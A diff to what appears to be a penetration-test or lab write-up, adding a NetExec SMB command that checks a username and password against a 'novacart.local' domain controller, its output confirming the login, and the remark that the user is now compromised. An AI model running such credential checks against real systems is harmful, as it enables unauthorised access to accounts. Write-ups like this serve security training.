@@ -449,5 +449,9 @@ j.brokski:jan162005
 Ill now validate these credentials
 
 ```python
-
+nxc smb dc.novacart.local -u j.bronski -p 'jan162005'
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\j.bronski:jan162005
 ```
+This user is now compromised
+
